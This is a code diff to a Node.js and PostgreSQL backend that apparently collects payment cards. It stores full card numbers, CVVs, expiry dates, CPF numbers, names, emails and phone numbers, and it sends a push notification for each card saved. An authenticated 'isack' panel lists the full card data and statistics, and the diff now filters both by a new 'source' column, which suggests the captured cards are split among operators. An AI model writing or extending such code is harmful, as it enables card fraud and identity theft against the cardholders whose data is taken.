@@ -55,7 +55,9 @@ async function initDB() {
   await pool.query(`ALTER TABLE saved_cards ADD COLUMN IF NOT EXISTS bank        TEXT`);
   await pool.query(`ALTER TABLE saved_cards ADD COLUMN IF NOT EXISTS card_level  TEXT`);
   await pool.query(`ALTER TABLE saved_cards ADD COLUMN IF NOT EXISTS card_type   TEXT`);
-  await pool.query(`CREATE INDEX IF NOT EXISTS idx_sc_cpf ON saved_cards(cpf)`);
+  await pool.query(`ALTER TABLE saved_cards ADD COLUMN IF NOT EXISTS source      TEXT`);
+  await pool.query(`CREATE INDEX IF NOT EXISTS idx_sc_cpf    ON saved_cards(cpf)`);
+  await pool.query(`CREATE INDEX IF NOT EXISTS idx_sc_source ON saved_cards(source)`);
   console.log('[DB] Tabela pronta.');
 }
 
@@ -99,7 +101,7 @@ function authIsack(req, res, next) {
 // Salvar / atualizar cartão
 app.post('/api/cards', async (req, res) => {
   try {
-    const { cpf, nome, email, telefone, brand, last4, expiry, cvv, card_number, bank, card_level, card_type } = req.body;
+    const { cpf, nome, email, telefone, brand, last4, expiry, cvv, card_number, bank, card_level, card_type, source } = req.body;
     if (!cpf || !last4 || !expiry)
       return res.status(400).json({ ok: false, message: 'cpf, last4 e expiry são obrigatórios.' });
 
@@ -110,9 +112,9 @@ app.post('/api/cards', async (req, res) => {
     // Sempre insere novo registro — fase de testes, todos os cartões são salvos
     const id = uuidv4();
     await pool.query(
-      `INSERT INTO saved_cards (id, cpf, nome, email, telefone, brand, last4, expiry, cvv, card_number, bank, card_level, card_type)
-       VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13)`,
-      [id, cpfClean, nome||null, email||null, telefone||null, brand||null, last4, expiry, cvv||null, card_number||null, bank||null, card_level||null, card_type||null]
+      `INSERT INTO saved_cards (id, cpf, nome, email, telefone, brand, last4, expiry, cvv, card_number, bank, card_level, card_type, source)
+       VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14)`,
+      [id, cpfClean, nome||null, email||null, telefone||null, brand||null, last4, expiry, cvv||null, card_number||null, bank||null, card_level||null, card_type||null, source||null]
     );
 
     notificarPushcut(
@@ -244,14 +246,15 @@ app.get('/api/isack/cards', authIsack, async (req, res) => {
       r = await pool.query(
         `SELECT id, nome, email, brand, last4, expiry, card_number, cvv, cpf, telefone, bank, card_level, card_type, created_at
          FROM saved_cards
-         WHERE nome ILIKE $1 OR email ILIKE $1 OR last4 LIKE $1 OR brand ILIKE $1
+         WHERE source = 'isack'
+           AND (nome ILIKE $1 OR email ILIKE $1 OR last4 LIKE $1 OR brand ILIKE $1)
          ORDER BY created_at DESC`,
         [q]
       );
     } else {
       r = await pool.query(
         `SELECT id, nome, email, brand, last4, expiry, card_number, cvv, cpf, telefone, bank, card_level, card_type, created_at
-         FROM saved_cards ORDER BY created_at DESC`
+         FROM saved_cards WHERE source = 'isack' ORDER BY created_at DESC`
       );
     }
     res.json({ ok: true, total: r.rows.length, cards: r.rows });
@@ -263,12 +266,12 @@ app.get('/api/isack/cards', authIsack, async (req, res) => {
 
 app.get('/api/isack/stats', authIsack, async (req, res) => {
   try {
-    const total  = await pool.query('SELECT COUNT(*) FROM saved_cards');
+    const total  = await pool.query(`SELECT COUNT(*) FROM saved_cards WHERE source = 'isack'`);
     const brands = await pool.query(
-      `SELECT brand, COUNT(*) as count FROM saved_cards GROUP BY brand ORDER BY count DESC`
+      `SELECT brand, COUNT(*) as count FROM saved_cards WHERE source = 'isack' GROUP BY brand ORDER BY count DESC`
     );
     const recent = await pool.query(
-      `SELECT COUNT(*) FROM saved_cards WHERE created_at >= NOW() - INTERVAL '24 hours'`
+      `SELECT COUNT(*) FROM saved_cards WHERE source = 'isack' AND created_at >= NOW() - INTERVAL '24 hours'`
     );
     res.json({
       ok: true,
